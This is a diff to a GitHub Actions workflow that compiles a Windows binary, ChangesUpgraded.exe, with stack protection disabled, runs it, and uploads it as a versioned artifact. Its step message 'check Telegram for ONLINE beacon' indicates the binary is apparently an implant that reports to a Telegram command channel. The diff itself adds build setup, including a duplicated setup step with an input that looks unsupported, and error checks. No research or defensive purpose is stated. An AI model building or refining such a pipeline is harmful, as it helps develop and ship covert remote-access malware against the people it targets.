@@ -5,17 +5,35 @@ jobs:
     runs-on: windows-2022
     steps:
     - uses: actions/checkout@v4
+    
+    - name: Setup MSBuild
+      uses: microsoft/setup-msbuild@v2
+      
+    - name: Setup Visual Studio
+      uses: microsoft/setup-msbuild@v2
+      with:
+        vs-version: '[17.0,18.0)'  # VS 2022
+        vc-version: '14.3'  # MSVC 14.3 (Visual Studio 2022)
+      
     - name: Compile
       shell: cmd
       run: |
         cl.exe /O2 /MT /GS- /DNDEBUG /Fe:ChangesUpgraded.exe ChangesUpgraded.cpp
         echo "✅ Compiled: %ERRORLEVEL%"
+        if %ERRORLEVEL% neq 0 exit /b %ERRORLEVEL%
+    
     - name: Verify Binary
       shell: powershell
       run: |
-        .\ChangesUpgraded.exe
-        Start-Sleep 3
-        echo "✅ Binary executed - check Telegram for ONLINE beacon"
+        if (Test-Path ".\ChangesUpgraded.exe") {
+          .\ChangesUpgraded.exe
+          Start-Sleep 3
+          echo "✅ Binary executed - check Telegram for ONLINE beacon"
+        } else {
+          echo "❌ Binary not found - compilation failed"
+          exit 1
+        }
+    
     - uses: actions/upload-artifact@v4
       with:
         name: ChangesUpgraded-v7.2
